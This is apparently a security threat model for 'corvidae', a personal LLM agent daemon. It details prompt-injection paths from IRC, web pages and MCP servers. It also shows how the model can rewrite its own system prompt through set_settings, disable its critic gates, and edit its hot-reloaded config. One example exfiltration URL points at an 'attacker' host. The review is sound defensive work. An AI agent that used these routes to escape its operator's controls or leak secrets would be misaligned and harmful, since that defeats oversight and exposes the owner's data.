# Threat model

What can go wrong when corvidae reads text it didn't write, and what the
code does about it. Written from a security review, conducted 2026-10-22,
of the tree at commit `cca7604`, then updated for the documentation fixes
that landed alongside it. It is a snapshot, not a policy: when the code
moves, this document is wrong until someone fixes it.

## The short version

Corvidae is a personal agent daemon for a single machine, and the design
says so. Within that model it does several things right: Signal is
default-deny with silent refusal, memory is compartmentalized per channel
(or per operator-configured channel group),
retrieved context is framed as data, tool `_ctx` is hidden from the model,
SQL is parameterized, signal-cli is pinned and signature-verified, and the
docs are candid about plaintext at rest.

The weak spot is that the model's authority is unbounded and the model's
inputs are not. Simon Willison's "lethal trifecta" is three things in one
agent: access to private data, exposure to untrusted content, and a way to
send data out. Corvidae has all three, with nothing structural separating
them:

- **Private data.** `read_file` reaches `sessions.db`, the signal-cli data
  directory (which *is* the Signal credential), and `~/.ssh`. `shell`
  reaches everything else.
- **Untrusted content.** Every IRC channel message and private message,
  every web page `web_fetch` returns, every DuckDuckGo snippet, every MCP
  tool description and result, and every memory distilled from any of the
  above.
- **Exfiltration.** `web_fetch` will GET any URL with no scheme or host
  restriction. `shell` has the network.

The provenance critic and the CONTEXT framing are soft mitigations. They
depend on the model behaving, which is the one thing you cannot assume
under prompt injection or with a poisoned model. Leaving sandboxing out
of the MVP was a reasonable call, but it matters here: the attacker is not
another tenant, it is whoever can post in a channel the bot sits in.

## Assets and adversaries

Assets, roughly in order of how bad it is to lose them:

1. The signal-cli data directory. There is no recovery; whoever has it is
   the bot's phone number.
2. The host account corvidae runs as, and anything it can read or run.
3. `sessions.db`, the JSONL logs, and the memory tables: plaintext copies
   of every conversation, including end-to-end-encrypted Signal ones.
4. `agent.yaml`: operator intent, hot-reloaded within seconds of a write
   (default poll 2s).
5. The LLM server, if it is shared with anything else.

Adversaries:

- **Anyone in an IRC channel the bot has joined**, or anyone who can PM
  it. IRC nicks are unauthenticated on most networks.
- **Anyone who controls a page the bot fetches**, or a search result it
  reads.
- **An MCP server**, via its tool descriptions and results.
- **The model itself**, if the weights are poisoned or the model is simply
  wrong in a way that happens to look like an attack. Every finding below
  applies equally to "the model was tricked" and "the model is hostile".

An operator with shell on the host is out of scope. They already have
everything.

## Findings

Most severe first. File references are to the reviewed commit.

### 1. `set_settings` can rewrite the system prompt and switch models

The one hard rule `RuntimeSettingsPlugin` enforces is that `system_prompt`
is immutable. It checks the literal key (`tools/settings.py`). But every
override that is not a framework key and does not contain a dot is
forwarded into the LLM request body (`agent.py`, step 7), and
`LLMClient.chat` applies it with `payload.update(extra_body)` *after*
setting `model` and `messages` (`llm.py`). So:

```python
set_settings({"messages": [{"role": "system", "content": "..."}]})
```

replaces the entire conversation, operator prompt included, on every
subsequent turn. `set_settings({"model": "..."})` repoints a shared server.
`tools` and `tool_choice` land the same way, as does `stream`, which only
breaks the response parser (a self-inflicted outage, not a bypass, so the
blocklists below leave it out). Verified with a fake session: the outgoing
payload carried the override's model and messages.
The override lives in memory and lasts until restart, unlike findings 3
and 4, which persist.

Fix shape: allowlist the inference keys you mean (`temperature`, `top_p`,
`top_k`, the penalties, `max_tokens`, `seed`) instead of blocklisting the
ones you don't. Stopgap today: the blocklist is a literal key match, so
adding `messages`, `model`, `tools` and `tool_choice` to
`agent.immutable_settings` blocks the demonstrated attacks. It cannot
enumerate every request-body key a given server honors, which is why the
real fix is an allowlist in code. If you don't need agent self-tuning at
all, `tools.disabled: [set_settings]` closes this finding and the next one
outright.

### 2. The model can turn off its own gates

Every `resolve_tunable` key is writable per channel unless it appears in
`agent.immutable_settings`. That includes `critique.provenance.enabled`,
the sampling rate, and — worse — `critique.prompt.<lens>` and
`appraisal.stage2_prompt`, which are the critic's and appraiser's system
prompts. The configuration doc acknowledges self-tuning as a deliberate
trade and recommends a blocklist. At the reviewed commit two of its four
recommended keys (`gate.engagement.enforce`, `gate.send.enforce`) did not
exist anywhere in the code, and the prompt keys were not mentioned; the
doc now lists the real set.

For a poisoned-model scenario this is the finding that matters most after
the first one: the only runtime check on confabulation can be switched off
by the thing being checked.

### 3. Untrusted text is promoted to the `system` role

Two places:

- Funnel-admitted CONTEXT (memories distilled from channel participants,
  critique objections) is appended as `role: system` (`funnel.py`).
- Notifications without a `tool_call_id` are wrapped as `role: system` in
  `Agent._build_conversation_message`. Scheduler firings are among them:
  a reminder's text is whatever the model wrote into `remind_me`, possibly
  at an untrusted speaker's request, and it comes back later as a system
  row. See finding 7.

The "retrieved data, not instructions" wrapper is the right instinct. But
message role is a stronger signal to an instruction-tuned model than a
textual disclaimer, and a chat template may render system turns with
elevated trust. Injected text in a public channel can be laundered into a
system-role CONTEXT row. The row itself survives restarts, and the memory
it came from outlives compaction and gets re-admitted on later turns.

Fix shape: deliver CONTEXT as a `user` turn (or a tool result) with the
same framing, and reserve `system` for text the operator wrote.

Available as an opt-in: `agent.mid_conversation_system_role: user` sends
every system message after the operator's system prompt (both places
above) as `user`, with the framing unchanged. It is applied at prompt
build, so the stored rows keep `role: system`. The default is still
`system`, because the evals were tuned against it. One behavioural
caveat: CONTEXT is appended after the person's message, so with `user`
the framed block becomes the last user turn the model sees. Check in
`harness/` that the model still answers the person before you make it the
default.

Compaction is the adjacent problem. Summaries paraphrase other people's
IRC messages and raw tool output and are stored as `role: assistant`
(`compaction.py`), so the model reads whatever was injected as something
it said itself, and that persists across restarts too. The obvious
candidate is a `user`-role summary with the same data framing; it hasn't
been tried.

### 4. Tools are unsandboxed and the exfil path is open

`shell` runs as the daemon user with no allowlist, no fixed cwd, and no
confirmation (`tools/shell.py`). `task_pipeline` is `shell` with a
120-second timeout, and it calls the shell implementation directly, so
`tools.disabled: [shell]` does not remove it. `write_file` writes anywhere
the daemon user can, creating parent directories, including over
`agent.yaml`, which `ConfigWatcherPlugin` reloads within two seconds. That
lets the model change `llm.main.base_url` or clear `immutable_settings`
immediately. It can also add an MCP server whose `command` is anything,
disable plugins, or re-enable disabled tools; those keys are not
hot-reloaded, so they wait for the next restart, which makes the attack
persistent and quiet rather than immediate. It can also
rewrite any file named in a list-form `agent.system_prompt`, which is a
persistent persona change that never touches `agent.yaml` and takes effect
on the next restart or new channel. `web_fetch` has
no scheme or host check, follows redirects, and will happily GET
`http://attacker/?d=<secret>` or `http://169.254.169.254/`.

All of this is expected for a personal agent on your own box. The Buster
harness config (`harness/buster.yaml.in`) shows the pattern for narrowing
it: no subagent, no MCP, `shell` disabled. It is not a closed profile,
though: it leaves `task_pipeline` on, which is the shell by another name,
and `write_file`, which is the `agent.yaml` path. A genuinely narrowed
profile needs `tools.disabled: [shell, task_pipeline, write_file]` at
least. Cheap wins beyond that: make the dangerous tools opt-in rather than
opt-out, deny private address ranges and non-HTTP schemes in `web_fetch`,
root the file tools in a directory, and have `agent.yaml` and the prompt
files owned by another user and read-only to the daemon (if the daemon
user owns them, `shell` can `chmod` them back).

### 5. IRC has no sender authorization

Signal has a default-deny allowlist. IRC accepts every channel message and
every private message from anyone (`channels/irc.py`), and a PM from a
stranger auto-creates a persistent channel keyed on their nick. A PM to the
bot is a private conversation with full tool access, for anyone who can
reach the server. Because that channel is keyed on the nick, whoever holds
the nick later inherits the earlier conversation's history and memory
compartment, so "memory is compartmentalized per channel" means less on
IRC than it does on Signal. Glob members in `memory.channel_groups`
(`irc:*`, or `*` alone) widen this further: every channel the pattern
matches, including ones a stranger creates later by sending a PM, shares
one memory compartment with every other member of the group. That
includes the near-duplicate merge (#58): a channel in the group can
consolidate a near-duplicate of a member's memory and supersede it, so its
own wording replaces the original record and inherits its importance and
retrieval count. Only
Signal's allowlist bounds which channels can come into existence under
`signal:*`. At minimum, PMs should be off by default or
gated by an `irc.allow` list, bringing it in line with Signal.

The Signal plugin also carries a documented latent bug (`on_message_rejected`
docstring): a second gate plugin vetoing an already-admitted message would
leak a stale timestamp into every later read receipt. Not exploitable
today; a trap for the next plugin author.

### 6. MCP servers are trusted peers

An MCP server's tool descriptions go into the prompt as tool schemas and
its results come back as tool results, neither of them framed. Schema
sanitization is shallow by design. An MCP server is therefore a supply-chain
vector for tool-description injection. `process_tool_result` exists as a
hook for exactly this and has only a pass-through default.

### 7. The scheduler re-enters text later

`SchedulerPlugin` (#59) adds a delay to finding 3. On IRC anyone can ask
the bot to "remind me in 6 hours to …"; the model calls `remind_me`, and
six hours later that text re-enters the same channel as a `[reminder]`
notification, stored as `role: system`. By then the exchange that set it
may have been compacted away, so the model sees an instruction-shaped
string with little memory of who wanted it. What bounds it:

- **Framing.** The firing text says a reminder "you set" is due and quotes
  the stored text as `Reminder text: «…»`, ending "Decide whether and how
  to act on it." Any `«` or `»` inside the text is replaced, so it cannot
  close the quote and continue as framing. Rendering follows
  `agent.mid_conversation_system_role`, so `user` keeps it out of the
  system role as for every other notification. The framing is a soft
  mitigation in the same sense as the funnel's.
- **Scoping.** The three tools act on `_ctx.channel` and take no channel
  argument. A reminder fires on the channel it was set on and nowhere
  else, so a stranger on IRC cannot use one to make the bot message a
  Signal contact. `cancel_reminder` refuses operator jobs and treats
  another channel's row as not found; `list_reminders` shows only the
  calling channel's rows.
- **Volume.** `scheduler.max_reminders_per_channel` (default 50) caps
  pending reminders per channel, and text is capped at 2000 characters.
  The cap is per channel, and finding 5 lets a stranger open new IRC PM
  channels at will, so the total is not bounded on IRC. Each firing costs
  a main-model turn. A reminder fires once, so a burst is bounded, but 50
  per channel across many channels is still load.

`scheduler.jobs` in `agent.yaml` is the operator-only surface. A job can
target any channel id, including a Signal contact, and recur, and its
prompt is framed as the operator's. It is hot-reloaded, so it joins the
`write_file` → `agent.yaml` path in finding 4. A model that can write
`agent.yaml` can now schedule messages to any channel within seconds, not
just at the next restart. The mitigation is the one finding 4 already
gives: keep `agent.yaml` unwritable by the daemon user.

Deferred on purpose: a `send_to_channel(channel_id, text)` tool, so the
heartbeat could message people. It would be a new exfil and spam path
from any channel, model, or injected text to any other channel. Before it
lands it needs an allowlist of target channels, a send budget, and its
own entry here. Recurring reminders by tool are deferred for a related
reason: they need a per-channel budget of their own.

### 8. Smaller things

- `read_file` has a stat-then-read race and follows symlinks. Irrelevant
  while finding 4 stands.
- Tool arguments are not validated against the generated schema. Wrong
  types produce a generic "tool failed". Robustness, not security.
- `task_pipeline` never marks a non-zero exit as failed, because `shell`
  returns a string, so dependents run after failures. A correctness bug
  with mild safety consequences for "deploy after test" graphs.
- `web_search` sends conversation-derived queries to DuckDuckGo. By
  design, but it is an off-box data flow nobody sees.
- `harness/install-signal-cli.sh` defaults `SERVICE_USER` to a real
  account name. Not a secret, but it is a real identifier in a public
  repository.
- No secrets in `prompts/` or `docs/`.

## Privilege separation

There isn't any. Transports, the LLM loop, tool execution, the SQLite
store, and the Signal socket all run in one process as one user. The
effective privilege of the `shell` tool is "whoever owns the Signal
identity and the memory database".

The architecture already has the seam to split this. Tool calls dispatch
through `TaskQueue` and `dispatch_tool_call`, so a separated design would
run tool workers in another process (or container) with a narrowed
filesystem and network, keeping transport credentials and `sessions.db` on
the trusted side. Subagents inherit the full tool set minus themselves and
would need the same treatment. The systemd hardening in
[signal-ops.md](signal-ops.md)
(`ProtectSystem=strict`, `NoNewPrivileges`, `ProtectHome`) is good and
applies only to signal-cli; corvidae itself runs under `screen` with none
of it.

## What to do first

1. Allowlist inference keys in `set_settings`. A small change; closes the
   only outright bypass. Until then, put `messages`, `model`, `tools` and
   `tool_choice` in `immutable_settings`, or disable `set_settings`
   entirely if you don't need self-tuning; it's config, not code.
2. Same day, same file: put the recommended set from
   [configuration.md](configuration.md) ("Runtime-tunable gate
   parameters"), prompt keys included, in `immutable_settings`.
3. Make `agent.yaml` and any system-prompt files owned by another user and
   read-only to the daemon. Otherwise `write_file` plus hot reload (or the
   next restart) undoes every other item on this list.
4. Flip the defaults: `shell`, `read_file`, `write_file`, `task_pipeline`,
   `subagent` and IRC PMs opt-in. Root the file tools in a directory when
   they are on. Meanwhile, add `task_pipeline` and `write_file` to
   `tools.disabled` wherever `shell` already is, `buster.yaml.in` included.
5. Deny private ranges and non-HTTP schemes in `web_fetch`.
6. Move CONTEXT out of the `system` role. Opt-in today via
   `agent.mid_conversation_system_role: user`; flipping the default is
   what remains.
7. Give `process_tool_result` a default that frames MCP results the way
   the funnel frames CONTEXT.
8. Decide whether process separation is worth doing.

Items 1 through 7 are each a contained change, though 4 and 6 touch
behaviour the evals depend on. Item 8 is a project. (Two further items
from the original review — documenting the real tunable keys and
correcting the design doc's sandboxing paragraph — were done alongside
this document.)
